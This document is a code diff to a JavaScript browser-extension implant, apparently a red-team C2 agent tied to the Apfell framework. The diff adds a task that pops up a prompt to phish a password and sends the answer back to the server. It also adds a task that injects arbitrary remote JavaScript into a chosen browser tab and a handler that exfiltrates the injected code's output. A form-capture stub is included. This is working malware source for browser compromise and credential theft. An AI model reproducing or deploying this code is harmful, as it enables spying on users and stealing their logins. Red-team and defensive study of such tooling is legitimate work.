@@ -20,7 +20,7 @@ class SporeConfiguration {
     }
 }
 
-const config = new SporeConfiguration("480s9sdf09sf9sdjfskdlaskdfjlasdf", "localhost", "websocket", 443, true);
+const config = new SporeConfiguration("blah", "127.0.0.1", "websocket", 443, true);
 // Connect to the server
 const connection = new WebSocket(config.serverurl);
 let out = [];
@@ -77,7 +77,6 @@ function httpReq(url,method,headers,body)
             xmlHttp.setRequestHeader(p, headers[p])
         }
     }
-    console.log(body);
     const data_array = base64StringToDataArray(body);
     xmlHttp.send(data_array);
     return xmlHttp;
@@ -124,6 +123,16 @@ setInterval(function(){
                 const metaenvelope = JSON.stringify(meta);
                 out.push(metaenvelope);
                 break;
+            }
+            case 'custom': {
+                // catch output from custom javascript injected into tabs
+                let payload = btoa(unescape(encodeURIComponent(JSON.stringify(message.data))));
+                let envelope = CreateApfellMessage(2, config.apfellID, config.UUID, message.data.length, keylogTaskID, 9, payload);
+                const meta = {};
+                meta.type = 3;
+                meta.metadata = envelope;
+                const metaenvelope = JSON.stringify(meta);
+                out.push(metaenvelope);
             }
         }
 
@@ -261,6 +270,46 @@ setInterval(function(){
                         const metaenvelope = JSON.stringify(meta);
                         out.push(metaenvelope);
                     });
+                } else if (tasktype === 7) {
+                    // form capture
+                    // TODO: Form capture code
+                } else if (tasktype === 8) {
+                    // prompt
+
+                    let txt = atob(data['data']);
+                    let ans = [];
+                    let pass = prompt(txt);
+                    if (pass != null){
+                        ans.push(pass);
+                    } else {
+                        ans.push('User cancelled');
+                    }
+
+                    const promptdata = btoa(unescape(encodeURIComponent((JSON.stringify(ans)))));
+                    const apfellMsg = CreateApfellMessage(2, config.apfellID, config.UUID, data.length, taskid, tasktype, promptdata);
+                    let meta = {};
+                    meta["metatype"] = 3;
+                    meta["metadata"] = apfellMsg;
+                    const metaenvelope = JSON.stringify(meta);
+                    out.push(metaenvelope);
+                } else if (tasktype === 9) {
+                    // execute custom javascript code in a tab
+                    let args = JSON.parse(atob(data['data'].toString()));
+                    const tab = Math.round(args["tabid"]);
+                    const code = atob(args["javascript"]);
+
+                    chrome.tabs.executeScript(tab, {
+                        code: code
+                    });
+
+                    const started = btoa(unescape(encodeURIComponent("Injected code into tab: "+tab)));
+                    const apfellmsg = CreateApfellMessage(2, config.apfellID, config.UUID, started.length, taskid, tasktype, started);
+                    let meta = {};
+                    meta["metatype"] = 3;
+                    meta["metadata"] = apfellmsg;
+                    const metaenvelope = JSON.stringify(meta);
+                    out.push(metaenvelope);
+
                 }
             }
         }
